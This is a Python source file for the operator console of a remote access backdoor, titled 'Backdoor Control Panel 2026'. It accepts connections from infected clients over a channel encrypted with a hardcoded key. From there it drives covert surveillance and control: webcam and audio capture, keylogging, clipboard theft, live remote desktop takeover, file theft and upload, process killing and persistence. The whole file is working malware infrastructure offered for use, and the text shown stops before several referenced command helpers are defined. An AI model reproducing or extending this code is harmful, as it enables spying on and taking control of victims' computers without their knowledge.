#!/usr/bin/env python3
"""
gui_server.py - GUI Control Panel for AdvancedBackdoor 2026 Edition
Includes real-time remote desktop viewer with mouse/keyboard passthrough.
"""

import socket
import json
import os
import io
import base64
import threading
import time
import queue
import tkinter as tk
from tkinter import scrolledtext, filedialog, messagebox, simpledialog
from datetime import datetime

DEFAULT_PORT = 5555
BUFFER_SIZE = 4096

# ─── Encrypted channel (must match client.py) ────────────────────────────────
_SHARED_KEY = b'BackdoorKey2026!AdvancedSecurity'   # exactly 32 bytes
try:
    from cryptography.fernet import Fernet as _Fernet
    _cipher = _Fernet(base64.urlsafe_b64encode(_SHARED_KEY))
    ENCRYPTED = True
except ImportError:
    _cipher = None
    ENCRYPTED = False
# ─────────────────────────────────────────────────────────────────────────────


# ─── Remote Desktop Viewer ────────────────────────────────────────────────────

class RemoteDesktopViewer:
    """
    Toplevel window that shows a live JPEG stream from the client and
    forwards mouse/keyboard events back as JSON control messages.

    Protocol (after handshake):
      Client → Server : [4-byte big-endian length][JPEG bytes]  (loop)
                        [0x00 0x00 0x00 0x00]                   (end marker)
      Server → Client : {"type":"…", …}\n                       (sparse events)
    """

    _KEY_MAP = {
        "Return":    "enter",    "BackSpace": "backspace", "Tab":      "tab",
        "Escape":    "esc",      "Delete":    "delete",    "Home":     "home",
        "End":       "end",      "Prior":     "pageup",    "Next":     "pagedown",
        "Up":        "up",       "Down":      "down",      "Left":     "left",
        "Right":     "right",    "space":     "space",
        "F1":  "f1",  "F2":  "f2",  "F3":  "f3",  "F4":  "f4",
        "F5":  "f5",  "F6":  "f6",  "F7":  "f7",  "F8":  "f8",
        "F9":  "f9",  "F10": "f10", "F11": "f11", "F12": "f12",
        "Control_L": "ctrlleft",  "Control_R": "ctrlright",
        "Alt_L":     "altleft",   "Alt_R":     "altright",
        "Shift_L":   "shiftleft", "Shift_R":   "shiftright",
        "Win_L":     "winleft",   "Win_R":     "winright",
    }

    def __init__(self, conn, parent, done_event):
        self.conn = conn
        self.done_event = done_event
        self.active = True
        self.client_w = 1920
        self.client_h = 1080
        self._img_ref = None
        self._frame_times = []

        p = {
            "bg":      "#1e1e2e",
            "surface": "#181825",
            "overlay": "#313244",
            "text":    "#cdd6f4",
            "green":   "#a6e3a1",
            "red":     "#f38ba8",
            "yellow":  "#f9e2af",
            "dim":     "#6c7086",
        }

        self.win = tk.Toplevel(parent)
        self.win.title("Remote Desktop — Live View")
        self.win.configure(bg=p["bg"])
        self.win.geometry("1280x760")
        self.win.minsize(800, 500)

        # ── toolbar ──────────────────────────────────────────────────────────
        toolbar = tk.Frame(self.win, bg=p["surface"], pady=3)
        toolbar.pack(fill=tk.X, side=tk.TOP)

        tk.Label(toolbar, text="Quality:", bg=p["surface"], fg=p["text"],
                 font=("Consolas", 9)).pack(side=tk.LEFT, padx=(8, 2))
        self.quality_var = tk.IntVar(value=30)
        tk.Scale(toolbar, from_=5, to=85, orient=tk.HORIZONTAL,
                 variable=self.quality_var, bg=p["surface"], fg=p["text"],
                 troughcolor=p["overlay"], highlightthickness=0,
                 length=110, showvalue=True).pack(side=tk.LEFT, pady=1)

        tk.Label(toolbar, text="FPS:", bg=p["surface"], fg=p["text"],
                 font=("Consolas", 9)).pack(side=tk.LEFT, padx=(10, 2))
        self.fps_var = tk.IntVar(value=15)
        tk.Scale(toolbar, from_=1, to=30, orient=tk.HORIZONTAL,
                 variable=self.fps_var, bg=p["surface"], fg=p["text"],
                 troughcolor=p["overlay"], highlightthickness=0,
                 length=90, showvalue=True).pack(side=tk.LEFT, pady=1)

        self.status_lbl = tk.Label(
            toolbar, text="● Connecting…",
            bg=p["surface"], fg=p["yellow"], font=("Consolas", 9, "bold"))
        self.status_lbl.pack(side=tk.LEFT, padx=14)

        self.fps_lbl = tk.Label(toolbar, text="─ fps", bg=p["surface"],
                                 fg=p["dim"], font=("Consolas", 9))
        self.fps_lbl.pack(side=tk.LEFT, padx=4)

        self.res_lbl = tk.Label(toolbar, text="", bg=p["surface"],
                                 fg=p["dim"], font=("Consolas", 9))
        self.res_lbl.pack(side=tk.LEFT, padx=4)

        tk.Button(toolbar, text="✕  Disconnect", command=self._on_close,
                  bg=p["red"], fg=p["bg"], font=("Consolas", 9, "bold"),
                  relief=tk.FLAT, cursor="hand2", padx=10).pack(
                      side=tk.RIGHT, padx=8, pady=3)

        # ── canvas (live screen view) ─────────────────────────────────────────
        self.canvas = tk.Canvas(self.win, bg="#000000", cursor="crosshair",
                                 highlightthickness=0)
        self.canvas.pack(fill=tk.BOTH, expand=True)

        # ── input bindings ────────────────────────────────────────────────────
        self.canvas.bind("<Motion>",          self._mouse_move)
        self.canvas.bind("<Button-1>",        self._left_click)
        self.canvas.bind("<Button-3>",        self._right_click)
        self.canvas.bind("<Double-Button-1>", self._double_click)
        self.canvas.bind("<MouseWheel>",      self._scroll)
        # Linux scroll buttons
        self.canvas.bind("<Button-4>",
                          lambda e: self._send_ctrl(
                              {"type": "mouse_scroll", "x": e.x, "y": e.y, "delta": 3}))
        self.canvas.bind("<Button-5>",
                          lambda e: self._send_ctrl(
                              {"type": "mouse_scroll", "x": e.x, "y": e.y, "delta": -3}))
        self.win.bind("<KeyPress>", self._key_press)
        self.win.focus_set()
        self.win.protocol("WM_DELETE_WINDOW", self._on_close)

        # Last quality/fps sent — to detect slider changes
        self._last_q = self.quality_var.get()
        self._last_f = self.fps_var.get()

        # Start frame receiver and settings sync
        threading.Thread(target=self._recv_loop, daemon=True).start()
        self.win.after(500, self._sync_settings)

    # ── frame reception ───────────────────────────────────────────────────────

    def _recvall(self, n):
        data = b""
        while len(data) < n:
            try:
                chunk = self.conn.recv(n - len(data))
                if not chunk:
                    return None
                data += chunk
            except Exception:
                return None
        return data

    def _recv_loop(self):
        from PIL import Image, ImageTk
        while self.active:
            try:
                header = self._recvall(4)
                if not header:
                    break
                length = int.from_bytes(header, "big")
                if length == 0:          # end-of-stream marker from client
                    break
                if length > 30_000_000:  # sanity guard (30 MB)
                    break
                data = self._recvall(length)
                if not data:
                    break

                img = Image.open(io.BytesIO(data))
                self.client_w, self.client_h = img.size

                cw = max(self.canvas.winfo_width(),  640)
                ch = max(self.canvas.winfo_height(), 480)
                resized = img.resize((cw, ch), Image.BILINEAR)
                photo = ImageTk.PhotoImage(resized)

                # Track FPS
                now = time.time()
                self._frame_times.append(now)
                self._frame_times = [t for t in self._frame_times
                                      if now - t < 1.0]
                fps = len(self._frame_times)

                self.win.after(0, self._show_frame, photo, fps)

            except Exception as e:
                if self.active:
                    print(f"[-] RD recv: {e}")
                break

        # Stream ended — auto-close viewer
        if self.active:
            self.win.after(0, self._on_close)

    def _show_frame(self, photo, fps):
        self._img_ref = photo   # prevent GC
        self.canvas.delete("frame")
        self.canvas.create_image(0, 0, anchor="nw", image=photo, tags="frame")
        self.status_lbl.config(text="● Live", fg="#a6e3a1")
        self.fps_lbl.config(text=f"{fps} fps")
        self.res_lbl.config(text=f"{self.client_w}×{self.client_h}")

    # ── settings sync ─────────────────────────────────────────────────────────

    def _sync_settings(self):
        if not self.active:
            return
        q = self.quality_var.get()
        f = self.fps_var.get()
        if q != self._last_q or f != self._last_f:
            self._send_ctrl({"type": "settings", "quality": q, "fps": f})
            self._last_q, self._last_f = q, f
        self.win.after(500, self._sync_settings)

    # ── coordinate scaling ────────────────────────────────────────────────────

    def _scale(self, cx, cy):
        cw = max(self.canvas.winfo_width(),  1)
        ch = max(self.canvas.winfo_height(), 1)
        return (int(cx * self.client_w / cw),
                int(cy * self.client_h / ch))

    # ── control event sender ──────────────────────────────────────────────────

    def _send_ctrl(self, evt):
        try:
            self.conn.sendall(json.dumps(evt).encode() + b"\n")
        except Exception:
            pass

    # ── mouse bindings ────────────────────────────────────────────────────────

    def _mouse_move(self, e):
        x, y = self._scale(e.x, e.y)
        self._send_ctrl({"type": "mouse_move", "x": x, "y": y})

    def _left_click(self, e):
        x, y = self._scale(e.x, e.y)
        self._send_ctrl({"type": "mouse_click", "x": x, "y": y, "btn": "left"})

    def _right_click(self, e):
        x, y = self._scale(e.x, e.y)
        self._send_ctrl({"type": "mouse_right", "x": x, "y": y})

    def _double_click(self, e):
        x, y = self._scale(e.x, e.y)
        self._send_ctrl({"type": "mouse_double", "x": x, "y": y})

    def _scroll(self, e):
        x, y = self._scale(e.x, e.y)
        delta = 3 if e.delta > 0 else -3
        self._send_ctrl({"type": "mouse_scroll", "x": x, "y": y,
                          "delta": delta})

    # ── keyboard binding ──────────────────────────────────────────────────────

    def _key_press(self, e):
        char = e.char
        sym  = e.keysym
        if char and char.isprintable() and char not in ("\r", "\t", "\x1b"):
            self._send_ctrl({"type": "key_type", "text": char})
        elif sym in self._KEY_MAP:
            self._send_ctrl({"type": "key_press", "key": self._KEY_MAP[sym]})

    # ── close ─────────────────────────────────────────────────────────────────

    def _on_close(self):
        if not self.active:
            return   # guard against double-call
        self.active = False
        self._send_ctrl({"type": "stop"})
        try:
            self.win.destroy()
        except Exception:
            pass
        self.done_event.set()


# ─── Main GUI ─────────────────────────────────────────────────────────────────

class BackdoorGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("Backdoor Control Panel 2026")
        self.root.geometry("1200x840")
        self.root.configure(bg="#1e1e2e")
        self.root.minsize(860, 640)

        self.server_socket = None
        self.server_running = False

        self.clients = {}          # cid -> {conn, addr}
        self._clients_index = []   # parallel to listbox
        self.active_client_id = None
        self.client_counter = 0
        self.clients_lock = threading.Lock()

        self.ui_queue = queue.Queue()
        self.cmd_history = []
        self.history_index = -1

        self._build_ui()
        self._process_queue()
        self.root.protocol("WM_DELETE_WINDOW", self._on_close)

    # ─── UI layout ────────────────────────────────────────────────────────────

    def _build_ui(self):
        p = {
            "bg":      "#1e1e2e",
            "surface": "#181825",
            "overlay": "#313244",
            "text":    "#cdd6f4",
            "dim":     "#6c7086",
            "blue":    "#89b4fa",
            "green":   "#a6e3a1",
            "red":     "#f38ba8",
            "yellow":  "#f9e2af",
            "mauve":   "#cba6f7",
            "teal":    "#94e2d5",
            "peach":   "#fab387",
        }

        # ── top bar ──────────────────────────────────────────────────────────
        top = tk.Frame(self.root, bg=p["surface"], pady=5)
        top.pack(fill=tk.X)

        tk.Label(top, text="Host:", bg=p["surface"], fg=p["text"],
                 font=("Consolas", 10)).pack(side=tk.LEFT, padx=(10, 2))
        self.host_var = tk.StringVar(value="0.0.0.0")
        tk.Entry(top, textvariable=self.host_var, width=15, bg=p["overlay"],
                 fg=p["text"], insertbackground="white",
                 relief=tk.FLAT, font=("Consolas", 10)).pack(
                     side=tk.LEFT, padx=2, ipady=2)

        tk.Label(top, text="Port:", bg=p["surface"], fg=p["text"],
                 font=("Consolas", 10)).pack(side=tk.LEFT, padx=(8, 2))
        self.port_var = tk.StringVar(value=str(DEFAULT_PORT))
        tk.Entry(top, textvariable=self.port_var, width=7, bg=p["overlay"],
                 fg=p["text"], insertbackground="white",
                 relief=tk.FLAT, font=("Consolas", 10)).pack(
                     side=tk.LEFT, padx=2, ipady=2)

        self.start_btn = tk.Button(
            top, text="▶  Start", command=self.start_server,
            bg=p["green"], fg=p["surface"], font=("Consolas", 10, "bold"),
            relief=tk.FLAT, padx=12, cursor="hand2")
        self.start_btn.pack(side=tk.LEFT, padx=(14, 4), pady=2)

        self.stop_btn = tk.Button(
            top, text="■  Stop", command=self.stop_server,
            bg=p["red"], fg=p["surface"], font=("Consolas", 10, "bold"),
            relief=tk.FLAT, padx=12, cursor="hand2", state=tk.DISABLED)
        self.stop_btn.pack(side=tk.LEFT, padx=4, pady=2)

        self.status_lbl = tk.Label(
            top, text="● Offline", bg=p["surface"], fg=p["red"],
            font=("Consolas", 10, "bold"))
        self.status_lbl.pack(side=tk.LEFT, padx=16)

        enc_color = p["green"] if ENCRYPTED else p["dim"]
        tk.Label(top,
                 text=("🔒 Encrypted" if ENCRYPTED else "🔓 Plaintext"),
                 bg=p["surface"], fg=enc_color,
                 font=("Consolas", 9)).pack(side=tk.RIGHT, padx=12)

        # ── main pane ────────────────────────────────────────────────────────
        pane = tk.PanedWindow(self.root, orient=tk.HORIZONTAL, bg=p["bg"],
                              sashwidth=4, sashrelief=tk.FLAT)
        pane.pack(fill=tk.BOTH, expand=True, padx=4, pady=4)

        # Left: client list
        left = tk.Frame(pane, bg=p["surface"], width=230)
        pane.add(left, minsize=180)

        tk.Label(left, text="CONNECTED CLIENTS", bg=p["surface"],
                 fg=p["blue"], font=("Consolas", 8, "bold")).pack(
                     anchor="w", padx=8, pady=(8, 2))

        self.client_lb = tk.Listbox(
            left, bg=p["overlay"], fg=p["text"],
            selectbackground=p["blue"], selectforeground=p["surface"],
            font=("Consolas", 9), relief=tk.FLAT, borderwidth=0,
            activestyle="none", highlightthickness=0)
        self.client_lb.pack(fill=tk.BOTH, expand=True, padx=6, pady=4)
        self.client_lb.bind("<<ListboxSelect>>", self._on_client_select)

        tk.Button(left, text="Disconnect", command=self.disconnect_client,
                  bg=p["red"], fg=p["surface"], font=("Consolas", 9, "bold"),
                  relief=tk.FLAT, cursor="hand2").pack(
                      fill=tk.X, padx=6, pady=(0, 6))

        # Right: terminal + buttons + input
        right = tk.Frame(pane, bg=p["bg"])
        pane.add(right, minsize=560)

        hdr = tk.Frame(right, bg=p["surface"])
        hdr.pack(fill=tk.X)
        self.session_lbl = tk.Label(
            hdr, text="— no client selected —",
            bg=p["surface"], fg=p["green"],
            font=("Consolas", 9, "bold"), anchor="w")
        self.session_lbl.pack(side=tk.LEFT, padx=8, pady=4)
        tk.Button(hdr, text="Clear", command=self.clear_output,
                  bg=p["overlay"], fg=p["text"], font=("Consolas", 8),
                  relief=tk.FLAT, cursor="hand2", padx=8).pack(
                      side=tk.RIGHT, padx=8, pady=3)

        self.out = scrolledtext.ScrolledText(
            right, bg=p["bg"], fg=p["text"], font=("Consolas", 10),
            relief=tk.FLAT, state=tk.DISABLED, wrap=tk.WORD,
            insertbackground="white", highlightthickness=0)
        self.out.pack(fill=tk.BOTH, expand=True, padx=4, pady=(4, 2))

        for tag, color in [
            ("ok",    p["green"]),  ("err",   p["red"]),
            ("info",  p["blue"]),   ("cmd",   p["yellow"]),
            ("sys",   p["mauve"]),  ("dim",   p["dim"]),
            ("data",  p["text"]),   ("teal",  p["teal"]),
            ("peach", p["peach"]),
        ]:
            self.out.tag_config(tag, foreground=color)

        # ── quick-action button grid ──────────────────────────────────────────
        qa = tk.LabelFrame(right, text=" Quick Actions ", bg=p["bg"],
                           fg=p["blue"], font=("Consolas", 8, "bold"),
                           relief=tk.GROOVE, bd=1)
        qa.pack(fill=tk.X, padx=4, pady=2)

        _g = "#2a3d2a"   # capture (green tint)
        _b = "#1e2a3d"   # system  (blue tint)
        _y = "#3d3422"   # surveillance (yellow tint)
        _r = "#3d1e2a"   # danger  (red tint)
        _t = "#1e3d3a"   # file / misc (teal tint)
        _d = p["overlay"] # default

        # (label, callback, bg)  — 5 columns × 5 rows = 25 buttons
        actions = [
            # Row 0 — capture
            ("Screenshot",     self.cmd_screenshot,     _g),
            ("Webcam Snap",    self.cmd_webcam,          _g),
            ("Webcam Video",   self.cmd_webcam_video,    _g),
            ("Audio Record",   self.cmd_audio_record,   _g),
            ("Screen Stream",  self.cmd_screen_stream,  _g),
            # Row 1 — remote desktop + system
            ("Remote Desktop", self.cmd_remote_desktop, "#2a1e3d"),
            ("Sysmon",         self.cmd_sysmon,          _b),
            ("Proc List",      self.cmd_ps,              _b),
            ("Kill PID",       self.cmd_kill,            _r),
            ("Netstat",        self.cmd_netstat,         _b),
            # Row 2 — surveillance
            ("Keylog Start",   self.cmd_keylog_start,   _y),
            ("Keylog Stop",    self.cmd_keylog_stop,     _y),
            ("Keylog Dump",    self.cmd_keylog_dump,     _y),
            ("Clipboard Get",  self.cmd_clipboard,       _y),
            ("Clipboard Set",  self.cmd_clipboard_set,  _y),
            # Row 3 — file ops
            ("Download",       self.cmd_download,        _t),
            ("Upload",         self.cmd_upload,          _t),
            ("File Search",    self.cmd_filesearch,      _t),
            ("Active Window",  self.cmd_active_window,  _t),
            ("Env Vars",       self.cmd_env,             _t),
            # Row 4 — misc
            ("Sysinfo",        self.cmd_sysinfo,         _b),
            ("Persist Add",    self.cmd_persist_add,     _r),
            ("Persist Remove", self.cmd_persist_remove,  _r),
            ("Help",           self.cmd_help,            _d),
        ]

        COLS = 5
        for i, (label, cb, bg) in enumerate(actions):
            tk.Button(qa, text=label, command=cb,
                      bg=bg, fg=p["text"], font=("Consolas", 8),
                      relief=tk.FLAT, padx=4, pady=3,
                      cursor="hand2").grid(
                          row=i // COLS, column=i % COLS,
                          padx=2, pady=2, sticky="ew")
        for c in range(COLS):
            qa.grid_columnconfigure(c, weight=1)

        # ── command input ─────────────────────────────────────────────────────
        inp = tk.Frame(right, bg=p["surface"])
        inp.pack(fill=tk.X, padx=4, pady=(2, 6))

        self.prompt_lbl = tk.Label(
            inp, text="backdoor> ", bg=p["surface"], fg=p["yellow"],
            font=("Consolas", 10, "bold"))
        self.prompt_lbl.pack(side=tk.LEFT, padx=(4, 0))

        self.cmd_entry = tk.Entry(
            inp, bg=p["overlay"], fg=p["text"],
            insertbackground="white", font=("Consolas", 10),
            relief=tk.FLAT, highlightthickness=0)
        self.cmd_entry.pack(side=tk.LEFT, fill=tk.X, expand=True,
                             padx=4, ipady=3)
        self.cmd_entry.bind("<Return>", self.send_command)
        self.cmd_entry.bind("<Up>",     self._hist_up)
        self.cmd_entry.bind("<Down>",   self._hist_down)

        tk.Button(inp, text="Send", command=self.send_command,
                  bg=p["blue"], fg=p["surface"],
                  font=("Consolas", 10, "bold"), relief=tk.FLAT,
                  padx=14, cursor="hand2").pack(side=tk.LEFT, pady=2)

    # ─── Thread-safe queue ────────────────────────────────────────────────────

    def _process_queue(self):
        try:
            while True:
                item = self.ui_queue.get_nowait()
                op = item[0]
                if op == "log":
                    self._write(item[1], item[2])
                elif op == "add_client":
                    _, cid, label = item
                    self.client_lb.insert(tk.END, label)
                    self._clients_index.append(cid)
                elif op == "del_client":
                    _, cid = item
                    if cid in self._clients_index:
                        idx = self._clients_index.index(cid)
                        self.client_lb.delete(idx)
                        self._clients_index.pop(idx)
                    if self.active_client_id == cid:
                        self.active_client_id = None
                        self.session_lbl.config(text="— no client selected —")
                        self.prompt_lbl.config(text="backdoor> ")
                elif op == "open_rdv":
                    # Must create Toplevel from the main thread
                    _, conn, cid, done_event = item
                    RemoteDesktopViewer(conn, self.root, done_event)
        except queue.Empty:
            pass
        self.root.after(80, self._process_queue)

    def _write(self, text, tag="data"):
        self.out.configure(state=tk.NORMAL)
        ts = datetime.now().strftime("%H:%M:%S")
        self.out.insert(tk.END, f"[{ts}] ", "dim")
        self.out.insert(tk.END, text + "\n", tag)
        self.out.configure(state=tk.DISABLED)
        self.out.see(tk.END)

    def log(self, text, tag="data"):
        self.ui_queue.put(("log", text, tag))

    def clear_output(self):
        self.out.configure(state=tk.NORMAL)
        self.out.delete(1.0, tk.END)
        self.out.configure(state=tk.DISABLED)

    # ─── Server start / stop ──────────────────────────────────────────────────

    def start_server(self):
        host = self.host_var.get().strip() or "0.0.0.0"
        try:
            port = int(self.port_var.get().strip())
        except ValueError:
            messagebox.showerror("Invalid Port", "Port must be a number.")
            return

        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            self.server_socket.bind((host, port))
            self.server_socket.listen(5)
        except Exception as e:
            messagebox.showerror("Bind Failed", str(e))
            self.server_socket.close()
            return

        self.server_running = True
        self.start_btn.config(state=tk.DISABLED)
        self.stop_btn.config(state=tk.NORMAL)
        self.status_lbl.config(text=f"● {host}:{port}", fg="#a6e3a1")
        self._write(f"Server listening on {host}:{port}"
                    f"  |  encrypted={ENCRYPTED}", "ok")
        threading.Thread(target=self._accept_loop, daemon=True).start()

    def stop_server(self):
        self.server_running = False
        if self.server_socket:
            try:
                self.server_socket.close()
            except Exception:
                pass
        with self.clients_lock:
            for info in self.clients.values():
                try:
                    info["conn"].close()
                except Exception:
                    pass
            self.clients.clear()
        self.client_lb.delete(0, tk.END)
        self._clients_index.clear()
        self.active_client_id = None
        self.session_lbl.config(text="— no client selected —")
        self.prompt_lbl.config(text="backdoor> ")
        self.start_btn.config(state=tk.NORMAL)
        self.stop_btn.config(state=tk.DISABLED)
        self.status_lbl.config(text="● Offline", fg="#f38ba8")
        self._write("Server stopped.", "err")

    def _accept_loop(self):
        while self.server_running:
            try:
                self.server_socket.settimeout(1.0)
                conn, addr = self.server_socket.accept()
            except socket.timeout:
                continue
            except Exception:
                break
            with self.clients_lock:
                self.client_counter += 1
                cid = self.client_counter
                self.clients[cid] = {"conn": conn, "addr": addr}
            label = f"#{cid}  {addr[0]}:{addr[1]}"
            self.ui_queue.put(("add_client", cid, label))
            self.log(f"New connection #{cid}  {addr[0]}:{addr[1]}", "ok")

    # ─── Client management ────────────────────────────────────────────────────

    def _on_client_select(self, _event=None):
        sel = self.client_lb.curselection()
        if not sel:
            return
        idx = sel[0]
        if idx >= len(self._clients_index):
            return
        cid = self._clients_index[idx]
        with self.clients_lock:
            info = self.clients.get(cid)
        if not info:
            return
        self.active_client_id = cid
        addr = info["addr"]
        self.session_lbl.config(
            text=f"Client #{cid}  —  {addr[0]}:{addr[1]}")
        self.prompt_lbl.config(text=f"backdoor[{addr[0]}]> ")
        self.log(f"Active client: #{cid} ({addr[0]}:{addr[1]})", "info")

    def disconnect_client(self):
        cid = self.active_client_id
        if cid is None:
            messagebox.showinfo("No Client", "Select a client first.")
            return
        with self.clients_lock:
            info = self.clients.pop(cid, None)
        if info:
            try:
                self._send(info["conn"], "quit")
                info["conn"].close()
            except Exception:
                pass
        self.ui_queue.put(("del_client", cid))
        self.log(f"Client #{cid} disconnected.", "err")

    # ─── Encrypted socket helpers ─────────────────────────────────────────────

    def _send(self, conn, data):
        try:
            payload = json.dumps(data).encode()
            if ENCRYPTED and _cipher:
                token = _cipher.encrypt(payload)
                payload = json.dumps({"e": token.decode()}).encode()
            conn.sendall(payload)
        except Exception as e:
            self.log(f"Send error: {e}", "err")

    def _recv(self, conn):
        buf = ""
        while True:
            try:
                chunk = conn.recv(BUFFER_SIZE).decode("utf-8", errors="replace")
                buf += chunk
                if not chunk:
                    return None
                parsed = json.loads(buf)
                if (ENCRYPTED and _cipher
                        and isinstance(parsed, dict) and "e" in parsed):
                    clear = _cipher.decrypt(parsed["e"].encode())
                    return json.loads(clear.decode())
                return parsed
            except ValueError:
                continue
            except Exception as e:
                self.log(f"Recv error: {e}", "err")
                return None

    def _recv_file(self, conn, save_path):
        raw = b""
        while True:
            chunk = conn.recv(BUFFER_SIZE)
            if not chunk:
                break
            if b"<END>" in chunk:
                raw += chunk.replace(b"<END>", b"")
                break
            raw += chunk
        try:
            decoded = base64.b64decode(raw)
            with open(save_path, "wb") as f:
                f.write(decoded)
            self.log(f"Saved: '{save_path}'  ({len(decoded):,} bytes)", "ok")
            return True
        except Exception as e:
            self.log(f"File save error: {e}", "err")
            return False

    def _send_file(self, conn, file_path):
        try:
            with open(file_path, "rb") as f:
                data = f.read()
            conn.sendall(base64.b64encode(data))
            time.sleep(0.3)
            conn.sendall(b"<END>")
            self.log(f"Sent: '{file_path}'  ({len(data):,} bytes)", "ok")
        except Exception as e:
            self.log(f"File send error: {e}", "err")

    # ─── Command dispatch ─────────────────────────────────────────────────────

    def _active_conn(self):
        if self.active_client_id is None:
            messagebox.showinfo("No Client", "Select a client first.")
            return None
        with self.clients_lock:
            info = self.clients.get(self.active_client_id)
        if info is None:
            messagebox.showinfo("Disconnected", "Client is no longer connected.")
            return None
        return info["conn"]

    def send_command(self, _event=None):
        cmd = self.cmd_entry.get().strip()
        if not cmd:
            return
        conn = self._active_conn()
        if conn is None:
            return
        self.cmd_entry.delete(0, tk.END)
        self.cmd_history.append(cmd)
        self.history_index = -1
        self.log(f">> {cmd}", "cmd")
        threading.Thread(
            target=self._dispatch,
            args=(conn, self.active_client_id, cmd),
            daemon=True).start()

    def _dispatch(self, conn, cid, cmd):
        try:
            self._run(conn, cid, cmd)
        except Exception as e:
            self.log(f"Error: {e}", "err")

    def _run(self, conn, cid, cmd):  # noqa: C901
        # ── download ─────────────────────────────────────────────────────────
        if cmd.startswith("download "):
            file_name = cmd[9:].strip()
            self._send(conn, cmd)
            msg = self._recv(conn)
            if msg:
                self.log(str(msg), "info" if "[UPLOAD]" in str(msg) else "err")
            if msg and "[UPLOAD]" in str(msg):
                self._recv_file(conn, file_name)

        # ── upload ────────────────────────────────────────────────────────────
        elif cmd.startswith("upload "):
            file_path = cmd[7:].strip()
            if not os.path.exists(file_path):
                self.log(f"Local file not found: '{file_path}'", "err")
                return
            self._send(conn, cmd)
            ready = self._recv(conn)
            if ready:
                self.log(str(ready), "info")
            self._send_file(conn, file_path)
            result = self._recv(conn)
            if result:
                self.log(str(result),
                         "ok" if "[DOWNLOAD]" in str(result) else "err")

        # ── screenshot ────────────────────────────────────────────────────────
        elif cmd == "screenshot":
            self._send(conn, cmd)
            status = self._recv(conn)
            if status:
                self.log(str(status), "ok" if "[+]" in str(status) else "err")
            if status and "[+]" in str(status):
                up = self._recv(conn)
                if up:
                    self.log(str(up), "info")
                self._recv_file(conn, f"screenshot_{int(time.time())}.png")

        # ── webcam ────────────────────────────────────────────────────────────
        elif cmd == "webcam":
            self._send(conn, cmd)
            status = self._recv(conn)
            if status:
                self.log(str(status), "ok" if "[+]" in str(status) else "err")
            if status and "[+]" in str(status):
                up = self._recv(conn)
                if up:
                    self.log(str(up), "info")
                self._recv_file(conn, f"webcam_{int(time.time())}.jpg")

        # ── webcam_video ──────────────────────────────────────────────────────
        elif cmd.startswith("webcam_video"):
            self._send(conn, cmd)
            rec = self._recv(conn)
            if rec:
                self.log(str(rec), "info")
            done = self._recv(conn)
            if done:
                self.log(str(done), "ok" if "[+]" in str(done) else "err")
            if done and "[+]" in str(done):
                up = self._recv(conn)
                if up:
                    self.log(str(up), "info")
                self._recv_file(conn, f"webcam_video_{int(time.time())}.avi")

        # ── audio_record ──────────────────────────────────────────────────────
        elif cmd.startswith("audio_record"):
            self._send(conn, cmd)
            rec = self._recv(conn)
            if rec:
                self.log(str(rec), "info")
            done = self._recv(conn)
            if done:
                self.log(str(done), "ok" if "[+]" in str(done) else "err")
            if done and "[+]" in str(done):
                up = self._recv(conn)
                if up:
                    self.log(str(up), "info")
                self._recv_file(conn, f"audio_{int(time.time())}.wav")

        # ── screen_stream ─────────────────────────────────────────────────────
        elif cmd.startswith("screen_stream"):
            parts = cmd.split()
            count = 5
            if len(parts) > 1:
                try:
                    count = int(parts[1])
                except Exception:
                    pass
            self._send(conn, cmd)
            init = self._recv(conn)
            if init:
                self.log(str(init), "info")
            for i in range(count):
                fmsg = self._recv(conn)
                if fmsg:
                    self.log(str(fmsg), "teal")
                if (fmsg and "[STREAM]" in str(fmsg)
                        and "failed" not in str(fmsg).lower()):
                    up = self._recv(conn)
                    if up:
                        self.log(str(up), "info")
                    fname = f"stream_{int(time.time())}_{i + 1:02d}.png"
                    self._recv_file(conn, fname)
            end = self._recv(conn)
            if end:
                self.log(str(end), "ok")

        # ── remote_desktop ────────────────────────────────────────────────────
        elif cmd == "remote_desktop":
            self._send(conn, cmd)   # encrypted command
            # Wait for 4-byte handshake marker "RDST" (raw, not encrypted)
            marker = b""
            while len(marker) < 4:
                chunk = conn.recv(4 - len(marker))
                if not chunk:
                    self.log("Remote desktop: connection lost during handshake",
                             "err")
                    return
                marker += chunk
            if marker != b"RDST":
                self.log(f"Remote desktop: bad handshake {marker!r}", "err")
                return
            self.log("Remote desktop: stream starting…", "info")
            # Ask main thread to open the viewer, then block until it closes
            done_event = threading.Event()
            self.ui_queue.put(("open_rdv", conn, cid, done_event))
            done_event.wait()
            self.log("Remote desktop: session ended.", "info")

        # ── quit ──────────────────────────────────────────────────────────────
        elif cmd == "quit":
            self._send(conn, cmd)
            with self.clients_lock:
                self.clients.pop(cid, None)
            self.ui_queue.put(("del_client", cid))
            self.log(f"Client #{cid} disconnected.", "err")

        # ── generic (text-response) command ───────────────────────────────────
        else:
            self._send(conn, cmd)
            response = self._recv(conn)
            if response is not None:
                self.log(str(response), "data")
            else:
                self.log("Connection lost.", "err")
                with self.clients_lock:
                    self.clients.pop(cid, None)
                self.ui_queue.put(("del_client", cid))

    # ─── History ──────────────────────────────────────────────────────────────

    def _hist_up(self, _=None):
        if not self.cmd_history:
            return
        self.history_index = min(self.history_index + 1,
                                  len(self.cmd_history) - 1)
        self.cmd_entry.delete(0, tk.END)
        self.cmd_entry.insert(0, self.cmd_history[-(self.history_index + 1)])

    def _hist_down(self, _=None):
        if self.history_index <= 0:
            self.history_index = -1
            self.cmd_entry.delete(0, tk.END)
            return
        self.history_index -= 1
        self.cmd_entry.delete(0, tk.END)
        self.cmd_entry.insert(0, self.cmd_history[-(self.history_index + 1)])

    # ─── Quick-action helpers ─────────────────────────────────────────────────

    def _quick(self, cmd):
        conn = self._active_conn()
        if conn is None:
            return
        self.log(f">> {cmd}", "cmd")
        self.cmd_history.append(cmd)
        threading.Thread(
            target=self._dispatch,
            args=(conn, self.active_client_id, cmd),
            daemon=True).start()

    # capture
    def cmd_screenshot(self):   self._quick("screenshot")
    def cmd_webcam(self):       self._quick("webcam")
    def cmd_sysinfo(self):      self._quick("sysinfo")
    def cmd_sysmon(self):       self._quick("sysmon")
    def cmd_ps(self):           self._quick("ps")
    def cmd_netstat(self):      self._quick("netstat")
    def cmd_env(self):          self._quick("env")
    def cmd_active_window(self): self._quick("active_window")
    def cmd_keylog_start(self): self._quick("keylog_start")
    def cmd_keylog_stop(self):  self._quick("keylog_stop")
